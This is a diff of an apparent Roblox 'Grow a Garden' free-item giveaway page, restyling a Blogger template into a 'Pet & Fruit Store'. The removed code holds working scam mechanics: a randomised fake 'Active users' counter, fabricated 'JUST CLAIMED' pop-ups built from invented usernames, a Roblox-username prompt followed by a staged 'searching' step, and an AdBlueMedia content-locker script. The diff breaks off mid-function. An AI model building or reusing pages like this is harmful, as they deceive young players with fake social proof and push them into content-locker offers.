@@ -1,1172 +1,944 @@
-
-
-
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>GROW A GARDEN</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&display=swap" rel="stylesheet">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <style>
-    /* LTR Styles */
-    body {
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      box-sizing: border-box;
-      font-family: 'Cairo', Arial, sans-serif;
-      position: relative;
-      overflow-x: hidden;
-      text-align: left;
-      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="%2354d33a" width="100" height="100"/><rect fill="%2363e645" width="50" height="50" x="25" y="25" opacity="0.8"/><rect fill="%234f8a2f" width="30" height="30" x="35" y="35" opacity="0.6"/></svg>') repeat;
-      background-size: 100px 100px;
-      background-position: center;
-    }
-    .logo-container {
-      text-align: center;
-      padding-top: 15px;
-    }
-    .logo-container img {
-      max-width: 180px;
-      filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5));
-    }
-    .content {
-      position: relative;
-      z-index: 1;
-    }
-    .top-bar {
-      width: 100vw;
-      display: flex;
-      flex-direction: row;
-      justify-content: center;
-      align-items: center;
-      gap: 14px;
-      box-sizing: border-box;
-      padding: 16px 0 0 0;
-      margin-bottom: 8px;
-    }
-    .active-users-box {
-      background: #0066cc;
-      border: 2.3px solid #fff;
-      border-radius: 13px;
-      padding: 13px 18px;
-      display: flex;
-      align-items: center;
-      font-size: 1.5em;
-      min-width: 220px;
-      max-width: 70vw;
-      margin: 0;
-      box-shadow: 0 1px 6px 0 rgba(0,0,0,0.09);
-      font-weight: 900;
-      font-family: 'Cairo', Arial, sans-serif;
-      height: 54px;
-      justify-content: center;
-      cursor: pointer;
-      transition: transform 0.17s cubic-bezier(.17,.67,.83,.67);
-      will-change: transform;
-      position: relative;
-      overflow: hidden;
-    }
-    .active-users-box:after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: 0.5s;
-    }
-    .active-users-box:hover:after {
-      left: 100%;
-    }
-    .active-users-box:active {
-      transform: scale(1.09) rotate(-2deg);
-      box-shadow: 0 0 0 6px #fff5, 0 2px 6px #0003;
-      z-index: 2;
-      filter: brightness(1.08);
-      background: #0055aa;
-    }
-    .active-users-box span:first-child {
-      color: #fff;
-      margin-right: 8px;
-      font-weight: 900;
-      font-size: 1.1em;
-      letter-spacing: 1px;
-    }
-    .active-users-count {
-      font-weight: 900;
-      font-family: 'Orbitron', 'Cairo', Arial, sans-serif;
-      margin-left: 8px;
-      font-size: 1.15em;
-      color: #FFD700;
-      text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
-    }
-    .select-title {
-      margin: 30px 0 24px 0;
-      text-align: center;
-      font-size: 1.7em;
-      color: #fff;
-      font-family: 'Cairo', Arial, sans-serif;
-      letter-spacing: .4px;
-      font-weight: 900;
-      text-shadow: 0 1px 5px #2225;
-      padding: 8px 0;
-      position: relative;
-    }
-    .select-title:after {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      left: 25%;
-      width: 50%;
-      height: 3px;
-      background: linear-gradient(to right, transparent, #ffd700, transparent);
-    }
-    .items-grid {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 26px;
-      margin-bottom: 40px;
-      width: 100%;
-      box-sizing: border-box;
-    }
-    .items-row {
-      display: flex;
-      gap: 22px;
-      width: 100%;
-      justify-content: center;
-      box-sizing: border-box;
-    }
-    .item-card {
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px #0002;
-      padding: 10px 8px 8px 8px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 170px;
-      min-width: 100px;
-      max-width: 31vw;
-      border: 2px solid #eee;
-      margin: 0;
-      position: relative;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      will-change: transform;
-      overflow: hidden;
-    }
-    .item-card:before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(45deg, rgba(255,215,0,0.1), rgba(255,215,0,0.05));
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-    .item-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 8px 15px rgba(0,0,0,0.2);
-    }
-    .item-card:active {
-      transform: scale(1.09) rotate(-2deg);
-      box-shadow: 0 0 0 6px #ffd70033, 0 2px 12px #0003;
-      z-index: 2;
-      filter: brightness(1.08);
-    }
-    .item-card.selected {
-      background: linear-gradient(135deg, #ffd700, #ffbf00);
-      border: 2px solid #d4af37;
-      box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
-      animation: goldenGlow 1.5s infinite alternate;
-    }
-    @keyframes goldenGlow {
-      from {
-        box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-      }
-      to {
-        box-shadow: 0 0 25px rgba(255, 215, 0, 0.9);
-      }
-    }
-    .item-img {
-      width: 110px;
-      height: 110px;
-      object-fit: cover;
-      border-radius: 8px;
-      background: #eaeaea;
-      margin-bottom: 10px;
-      border: none;
-      image-rendering: pixelated;
-      box-shadow: 0 0 13px #0001;
-      transition: box-shadow 0.12s, filter 0.12s;
-      display: block;
-      position: relative;
-      z-index: 1;
-    }
-    .item-card.selected .item-img {
-      box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
-      filter: brightness(1.05) contrast(1.1);
-    }
-    .item-name {
-      font-size: 1.08em;
-      color: #333;
-      font-family: 'Cairo', Arial, sans-serif;
-      text-align: center;
-      font-weight: 900;
-      letter-spacing: .2px;
-      margin-bottom: 0;
-      line-height: 1.2;
-      width: 100%;
-      overflow: hidden;
-      white-space: nowrap;
-      text-overflow: ellipsis;
-      background: none;
-      border-radius: 0;
-      border: none;
-      margin-top: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-sizing: border-box;
-      min-height: 28px;
-      position: relative;
-      z-index: 1;
-    }
-    .item-card.selected .item-name {
-      color: #8b7500;
-      text-shadow: 0 0 2px rgba(255, 215, 0, 0.5);
-    }
-    
-    /* تم تعديل هذا القسم لتحريك الإشعارات إلى الجانب الأيسر */
-    .cliameds {
-      position: fixed;
-      bottom: 65px;
-      left: 15px; /* تغيير إلى الجانب الأيسر */
-      z-index: 9999;
-    }
-    .message {
-      background-color: rgba(135, 206, 250, 0.85);
-      display: flex;
-      font-size: .8rem;
-      align-items: center;
-      padding: 10px 20px;
-      border-radius: 6px;
-      border: 2px solid rgba(238, 204, 159, 0.7);
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-    }
-    .message:after {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -60%;
-      width: 20%;
-      height: 200%;
-      background: rgba(255, 255, 255, 0.3);
-      transform: rotate(30deg);
-      transition: all 0.5s;
-    }
-    .message:hover:after {
-      left: 120%;
-    }
-    .message .img {
-      padding-right: 10px; /* تعديل ليكون الصورة على اليسار والنص على اليمين */
-      z-index: 2;
-    }
-    .message .img img {
-      width: 50px;
-      background: #fff;
-      border-radius: 50%;
-      height: 50px;
-      border: 2px solid #fff;
-      box-shadow: 0 0 8px rgba(0,0,0,0.3);
-    }
-    .message .more {
-      z-index: 2;
-    }
-    .message .more div:first-child {
-      font-weight: bold;
-      color: #0066cc;
-    }
-    .message .more div:last-child {
-      color: #333;
-      font-weight: 700;
-    }
-    @media (min-width: 800px) {
-      .cliameds {
-        bottom: 10px;
-      }
-    }
-    
-    /* التعديل الجديد للشاشات الكبيرة (الحاسوب) فقط */
-    @media (min-width: 901px) {
-      .items-grid {
-        display: grid;
-        grid-template-columns: repeat(5, 1fr); /* 5 أعمدة */
-        gap: 20px;
-        justify-content: center;
-        padding: 0 5%;
-      }
-      .items-row {
-        display: contents; /* يجعل العناصر تظهر مباشرة في الجريد */
-      }
-      .item-card {
-        width: 100%;
-        max-width: 180px;
-        margin: 0 auto;
-      }
-    }
-    
-    /* إرجاع تصميم الهاتف كما كان تمامًا */
-    @media (max-width: 900px) {
-      .items-grid {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 26px;
-      }
-      .items-row {
-        display: flex;
-        gap: 22px;
-        width: 100%;
-        justify-content: center;
-      }
-      .active-users-box {
-        font-size: 1.1em;
-        min-width: 145px;
-        padding: 9px 8px;
-        height: 38px;
-      }
-      .select-title {
-        font-size: 1.1em;
-      }
-      .items-row {
-        gap: 10px;
-      }
-      .item-card {
-        width: 31vw;
-        min-width: 0;
-        max-width: 32vw;
-        padding: 8px 2px 6px 2px;
-      }
-      .item-img {
-        width: 80px;
-        height: 80px;
-      }
-      .item-name {
-        min-height: 22px;
-        font-size: 0.95em;
-      }
-    }
-    @media (max-width: 700px) {
-      .items-grid {
-        gap: 5vw;
-      }
-      .items-row {
-        gap: 5vw;
-      }
-      .item-card {
-        width: 29vw;
-        max-width: 33vw;
-        min-width: 0;
-        padding: 5vw 1vw 2vw 1vw;
-      }
-      .item-img {
-        width: 24vw;
-        height: 24vw;
-        min-width: 62px;
-        min-height: 62px;
-        max-width: 110px;
-        max-height: 110px;
-      }
-      .item-name {
-        font-size: 0.92em;
-        min-height: 20px;
-      }
-    }
-    @media (max-width: 500px) {
-      .items-row {
-        gap: 2vw;
-      }
-      .item-card {
-        width: 30vw;
-        max-width: 33vw;
-        min-width: 0;
-        padding: 2vw 0.5vw 2vw 0.5vw;
-      }
-      .item-img {
-        width: 26vw;
-        height: 26vw;
-        min-width: 54px;
-        min-height: 54px;
-        max-width: 96px;
-        max-height: 96px;
-      }
-      .item-name {
-        font-size: 0.89em;
-        min-height: 16px;
-      }
-      .logo-container img {
-        max-width: 140px;
-      }
-      .cliameds {
-        left: 5px; /* تعديل موضع الإشعارات على الشاشات الصغيرة */
-      }
-    }
-    @media (max-width: 900px) {
-      .items-row {
-        flex-direction: row;
-        justify-content: center;
-        width: 100%;
-      }
-      .item-card {
-        margin-bottom: 0;
-      }
-    }
-    @media (max-width: 600px) {
-      .items-row {
-        flex-direction: row;
-        justify-content: center;
-        width: 100%;
-      }
-      .item-card {
-        margin-bottom: 0;
-      }
-      .top-bar {
-        padding-top: 9px;
-      }
-    }
-    
-    /* Purchase popup styles */
-    .purchase-popup {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
-    }
-    
-    .popup-content {
-      background-color: #333;
-      padding: 25px;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 380px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-      text-align: center;
-      color: white;
-      margin: auto;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-    }
-    
-    .popup-header {
-      position: relative;
-      padding-bottom: 20px;
-      margin-bottom: 15px;
-    }
-    
-    .popup-header h3 {
-      font-size: 24px;
-      margin: 0;
-      color: white;
-      font-weight: 700;
-    }
-    
-    .popup-header:after {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      left: 10%;
-      right: 10%;
-      height: 3px;
-      background-color: #666;
-    }
-    
-    .item-popup-image {
-      width: 130px;
-      height: 130px;
-      border-radius: 50%;
-      object-fit: cover;
-      margin: 0.3cm auto;
-      border: 3px solid #444;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-    }
-    
-    .item-confirm {
-      font-size: 18px;
-      margin: 0.3cm 0;
-      color: white;
-      font-weight: 700;
-      line-height: 1.4;
-    }
-    
-    .input-group {
-      margin-bottom: 25px;
-      text-align: left;
-    }
-    
-    .input-group label {
-      display: none;
-    }
-    
-    .input-group input {
-      width: 92%;
-      padding: 15px 12px;
-      background-color: white;
-      color: #333;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 15px;
-      font-weight: 600;
-    }
-    
-    .input-group input::placeholder {
-      color: #999;
-      font-weight: 700;
-    }
-    
-    .popup-buttons {
-      display: flex;
-      justify-content: space-between;
-      gap: 12px;
-    }
-    
-    .cancel-btn {
-      background-color: #555;
-      color: white;
-      border: none;
-      padding: 12px;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
-      flex: 1;
-      font-size: 15px;
-    }
-    
-    .free-btn {
-      background-color: white;
-      border: none;
-      padding: 12px;
-      border-radius: 5px;
-      cursor: pointer;
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 6px;
-    }
-    
-    .free-btn .free-badge {
-      color: #333;
-      font-weight: 900;
-      display: flex;
-      align-items: center;
-      font-size: 15px;
-    }
-    
-    .free-btn .free-icon {
-      width: 20px;
-      height: 20px;
-      background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
-      background-size: contain;
-      background-repeat: no-repeat;
-    }
-    
-    /* Searching state styles */
-    .searching-container {
-      text-align: center;
-      padding: 20px;
-    }
-    
-    .folding {
-      margin: 20px auto;
-      width: 70px;
-      height: 70px;
-      position: relative;
-      transform: rotateZ(45deg);
-    }
-    
-    .square {
-      position: absolute;
-      top: 30%;
-      right: 30%;
-      width: 30px;
-      height: 30px;
-      background-color: #000;
-      transform: rotateZ(87deg);
-    }
-    
-    .folding .sk-cube {
-      float: left;
-      width: 50%;
-      height: 50%;
-      position: relative;
-      transform: scale(1.1);
-    }
-    
-    .folding .sk-cube:before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: #fff;
-      animation: sk-foldCubeAngle 2.4s infinite linear both;
-      transform-origin: 100% 100%;
-    }
-    
-    .folding .sk-cube2 {
-      transform: scale(1.1) rotateZ(90deg);
-    }
-    
-    .folding .sk-cube3 {
-      transform: scale(1.1) rotateZ(180deg);
-    }
-    
-    .folding .sk-cube4 {
-      transform: scale(1.1) rotateZ(270deg);
-    }
-    
-    .folding .sk-cube2:before {
-      animation-delay: 0.3s;
-    }
-    
-    .folding .sk-cube3:before {
-      animation-delay: 0.6s;
-    }
-    
-    .folding .sk-cube4:before {
-      animation-delay: 0.9s;
-    }
-    
-    @keyframes sk-foldCubeAngle {
-      0%, 10% {
-        transform: perspective(140px) rotateX(-180deg);
-        opacity: 0;
-      }
-      25%, 75% {
-        transform: perspective(140px) rotateX(0deg);
-        opacity: 1;
-      }
-      90%, 100% {
-        transform: perspective(140px) rotateY(180deg);
-        opacity: 0;
-      }
-    }
-    
-    .searching-text {
-      color: white;
-      font-size: 18px;
-      margin-top: 20px;
-    }
-    
-    /* Success state styles */
-    .result-avatar {
-      width: 130px;
-      height: 130px;
-      border-radius: 50%;
-      object-fit: cover;
-      margin: 15px auto;
-      border: 3px solid #444;
-    }
-    
-    .result-username {
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      margin: 15px 0;
-    }
-    
-    .get-item-now-btn {
-      background-color: white;
-      color: #333;
-      border: none;
-      padding: 12px;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
-      font-size: 16px;
-      margin-top: 15px;
-      transition: all 0.3s;
-    }
-    
-    .get-item-now-btn:hover {
-      background-color: #f0f0f0;
-    }
-    
-    .d-none {
-      display: none !important;
-    }
-    
-    .user-error {
-      color: #ff6b6b;
-      font-size: 14px;
-      margin-top: 5px;
-      text-align: center;
-    }
-    
-    /* Mobile only adjustments */
-    @media (max-width: 480px) {
-      .item-popup-image {
-        width: 100px;
-        height: 100px;
-      }
-      
-      .popup-header:after {
-        left: 5%;
-        right: 5%;
-        height: 3px;
-      }
-      
-      .popup-content {
-        width: 90%;
-        max-width: 300px;
-        padding: 15px;
-      }
-    }
-    
-    /* Sound icon for buttons */
-    .sound-icon {
-      margin-left: 5px;
-      font-size: 14px;
-    }
-  </style>
-<link rel="me" href="https://www.blogger.com/profile/09867707712002395245" />
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<link rel="me" href="https://www.blogger.com/profile/11676149117892913435" />
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-</head>
-<body>
-
-  <div class="logo-container">
-    <img src="https://growgarden.dev/logo2.webp" alt="GROW A GARDEN Logo" border="0">
-  </div>
-  
-  <div class="content">
-    <div class="top-bar">
-      <div class="active-users-box">
-        <span>Active users :</span>
-        <span class="active-users-count" id="activeUsersCount"></span>
-      </div>
-    </div>
-
-    <div class="select-title">
-      SELECT AN ITEM YOU WISH TO GET IT
-    </div>
-
-    <!-- إرجاع هيكل الصفوف كما كان في الأصل للهواتف -->
-    <div class="items-grid" id="itemsGrid">
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/CKQBJ5hs/Elephant-Ears.webp" alt="Elephant-Ears">
-          <div class="item-name">Elephant-Ears</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/S7NCYqSm/Dragon-Pepper-Icon.webp" alt="Cacao">
-          <div class="item-name">dragon pepper</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/yFTnJfWw/Nectar-Thorn-Icon.webp" alt="Pepper">
-          <div class="item-name ">nectar thorn</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img"  src="https://i.ibb.co/Y4B0XkDv/Super-Seed-Icon.webp" alt="Super-Seed">
-          <div class="item-name"> Super-Seed</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/BHPJxK34/Candy-Blossom-Pic.webp" alt="Candy-Blossom">
-          <div class="item-name"> Candy-Blossom</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.pinimg.com/736x/34/03/9c/34039cefbfb882ae38b236cc00546a58.jpg" alt="Mango">
-          <div class="item-name">cooked owl</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/mFHyqLqt/Scarlet-Macaw-Icon.webp" alt="Dragon fruit">
-          <div class="item-name">Scarlet-Macaw</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/Z11xY1Xm/Feijoa-Icon.webp" alt="Flower-Seed">
-          <div class="item-name">Feijoa-Seed</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/YBKP5Kzm/Raccon-Better-Quality.webp" alt="Raccon-Better-Quality">
-          <div class="item-name"> Raccon</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/6RWMLXWf/Dragonfly-Icon.webp" alt="Dragonfly">
-          <div class="item-name">Dragonfly</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/ycQZWr8d/Queen-bee.webp" alt="Queen-bee">
-          <div class="item-name">Queen-bee</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://growgarden.dev/pets/ember.webp" alt="Ember Lily">
-          <div class="item-name">Ember Lily </div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://growgarden.dev/pets/butterfly.webp" alt="butterfly pet">
-          <div class="item-name">Butterfly pet</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://growgarden.dev/pets/disco.webp" alt="Disco Bee">
-          <div class="item-name">Disco Bee</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/rf5KdgnM/Master-Sprinkler.webp" alt="Master-Sprinkler">
-          <div class="item-name">Master-Sprinkler</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img"  src="https://i.ibb.co/Ndjw01bd/Sunflower-Produce.webp" alt="Sunflower-Produce ">
-          <div class="item-name">Sunflower</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/tpqr0P3W/Peacock.webp" alt="Bearbeee1" border="0">
-          <div class="item-name">peacock</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/mC7N04VB/Moon-Mango-Icon.webp" alt="Moon-Mango-Icon">
-          <div class="item-name">Moon-Mango</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/6pXrZSp/Reclaimer.webp" alt="Reclaimer">
-          <div class="item-name">Reclaimer</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/Jj90fCfD/Sugar-Apple-Icon.webp" alt="Sugar-Apple-Icon ">
-          <div class="item-name">Sugar-Apple</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/N69j6J0y/Bearbeee1.webp" alt="Bearbeee1" border="0">
-          <div class="item-name">Bear-bee</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/NczFPs8/Mimic-Octopus-Icon.webp" alt="Night-Egg">
-          <div class="item-name">Mimic-Octopus</div>
-        </div>
-      </div>
-      <div class="items-row">
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/NgsmLsRx/Grapwes.webp" alt="Grapwes">
-          <div class="item-name">Grapwes</div>
-        </div>
-        <div class="item-card">
-          <img class="item-img" src="https://i.ibb.co/Jj6thx4D/Mushroom-Crops-Pic.webp" alt="Mushroom">
-          <div class="item-name">Mushroom</div>
-        </div>
-      </div>
-    </div>
-  </div>
-  
-  <div class="cliameds"></div>
-  
-  <!-- Purchase Popup -->
-  <div class="purchase-popup" id="purchase-popup">
-    <div class="popup-content">
-      <!-- Dynamic content -->
-    </div>
-  </div>
-  
-  <!-- Sound elements -->
-  <audio id="dingSound" preload="auto">
-    <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
-  </audio>
-  
-  <audio id="clickSound" preload="auto">
-    <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
-  </audio>
-  
-  <!-- AdBlueMedia code --><script type="text/javascript">
-    var HlrzX_SBb_ROkXCc={"it":4523271,"key":"b8b5f"};
-</script>
-<script src="https://dfmpe7igjx4jo.cloudfront.net/0aeb752.js"></script>
-  <script>
-    // Function to generate random number between 90 and 900
-    function randomUsers() {
-      return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
-    }
-    function updateActiveUsers() {
-      document.getElementById('activeUsersCount').textContent = randomUsers();
-    }
-    updateActiveUsers();
-    setInterval(updateActiveUsers, 4500);
-    
-    // Notifications code
-    const avatars = [
-      'https://dress2.pages.dev/avatars/avatar1.png',
-      'https://dress2.pages.dev/avatars/avatar2.png',
-      'https://dress2.pages.dev/avatars/avatar3.png',
-      'https://dress2.pages.dev/avatars/avatar4.png',
-      'https://dress2.pages.dev/avatars/avatar5.png',
-      'https://dress2.pages.dev/avatars/avatar6.png',
-      'https://dress2.pages.dev/avatars/avatar7.png',
-      'https://dress2.pages.dev/avatars/avatar8.png',
-      'https://dress2.pages.dev/avatars/avatar9.png',
-      'https://dress2.pages.dev/avatars/avatar10.png'
-    ];
-
-    const items = [ 
-      'Super-Seed', 'Night-Egg', 'Candy-Blossom','Queen-bee','Dragonfly' , 'Golden Lab ',' Flower-Seed ' ,' Dragon fruit' ,'Mango',' Grapwes','Mushroom',      
-      'Star-Caller','Master-Sprinkler','Favorite-Tool','Harvest-tool','Honey-Sprinkler','Pepper' ,'Cacao'   ,'Beanstalk'    ,
-    ];
-
-    const usernames = [
-      'MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11','HAMZA22','tbonmk2','caroline34','dimaraja10','asktiyal9hba','ronaldo7','sidi_binzarn1','DERKAOUI_ZAML1','Tizit.botsot', 'Achnid22'
-    ];
-
-    // متغيرات للتحكم في الإشعارات
-    let notificationInterval;
-    let popupOpen = false;
-
-    function startNotifications() {
-      if (popupOpen) return;
-      
-      notificationInterval = setInterval(function() {
-        if (popupOpen) return;
-        
-        $(".cliameds").fadeIn(); 
-        
-        var html = `
-          <div class="message">
-            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
-            <div class="more">
-              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
-              <div> JUST CLAIMED '${items[Math.floor(Math.random() * items.length)]}'</div>
-            </div>
-          </div>
-        `;
-        $(".cliameds").html(html);
-
-        setTimeout(function() {
-          $(".cliameds").fadeOut();  
-        }, 3000);
-      }, 5000); // تم تغيير الفاصل الزمني إلى 7 ثوانٍ
-    }
-
-    function stopNotifications() {
-      clearInterval(notificationInterval);
-      $(".cliameds").fadeOut();
-    }
-    
-    // بدء الإشعارات عند تحميل الصفحة
-    startNotifications();
-    
-    // Function to show purchase popup
-    const showPurchasePopup = (itemName, itemImage) => {
-      // إيقاف الإشعارات عند فتح الواجهة
-      popupOpen = true;
-      stopNotifications();
-      
-      const popup = document.getElementById('purchase-popup');
-      const popupContent = popup.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item</h3>
-        </div>
-        <img src="${itemImage}" alt="Item Image" class="item-popup-image">
-        <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
-        <div class="input-group">
-          <input type="text" id="username-input" placeholder="Enter your Roblox username">
-        </div>
-        <div class="user-error d-none">Please enter a valid username</div>
-        <div class="popup-buttons">
-          <button class="cancel-btn">Cancel</button>
-          <button class="free-btn" id="search-user-btn">
-            <span class="free-icon"></span>
-            <span class="free-badge">continue</span>
-          </button>
-        </div>
-      `;
-      
-      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
-      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
-        // Play sound when clicking "continue" button
-        const clickSound = document.getElementById('clickSound');
-        clickSound.currentTime = 0;
-        clickSound.play();
-        
-        const username = document.getElementById('username-input').value.trim();
-        if (!username) {
-          document.querySelector('.user-error').classList.remove('d-none');
-          return;
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grow Garden - Pet & Fruit Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Fredoka+One&display=swap"
+        rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: url('https://i.postimg.cc/mD7zS1qn/Screenshot-2025-07-15-at-5-48-17-PM.png') no-repeat center center fixed;
+            background-size: cover;
+            position: relative;
         }
-        showSearchingState(username, itemName, itemImage);
-      });
-      
-      popup.style.display = 'flex';
-      document.getElementById('username-input').focus();
+
+        .font-fredoka {
+            font-family: 'Fredoka One', cursive;
+        }
+
+        /* Styles for the modals */
+        .modal-backdrop {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .price-text-old {
+            color: #f56565; /* red-500 */
+            text-shadow: 1px 1px #c53030; /* A darker red for the shadow */
+        }
+
+        /* Style for the item title stroke */
+        .item-title-stroke {
+             text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000, -2px 2px 3px rgba(0,0,0,0.3);
+        }
+
+        /* Loading Animation Styles */
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #10b981;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Progress bar animation */
+        .progress-bar {
+            width: 100%;
+            height: 1rem;
+            background-color: #374151;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #34d399);
+            border-radius: 0.5rem;
+            transition: width 0.5s ease-in-out;
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+        }
+
+        /* Pulsing animation for the modal title */
+        .pulse-title {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+    
+    /* Glossy card design */
+    .card-bg {
+        background: linear-gradient(145deg, #6CC24A, #58CC02);
+        border: 2px solid #3E721D;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+    }
+    .card-bg:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 10px 16px rgba(0,0,0,0.3);
     }
 
-    // Function to close popup
-    const closePurchasePopup = () => {
-      document.getElementById('purchase-popup').style.display = 'none';
-      popupOpen = false;
-      // إعادة تشغيل الإشعارات عند إغلاق الواجهة
-      startNotifications();
+
+    /* Stylish quantity buttons */
+    .quantity-minus, .quantity-plus {
+        background: linear-gradient(135deg, #FFD93D, #FFB347);
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease-in-out;
+    }
+    .quantity-minus:hover, .quantity-plus:hover {
+        background: linear-gradient(135deg, #FFB347, #FF8C00);
+        transform: scale(1.1);
     }
 
-    // Function to show searching state
-    const showSearchingState = (username, itemName, itemImage) => {
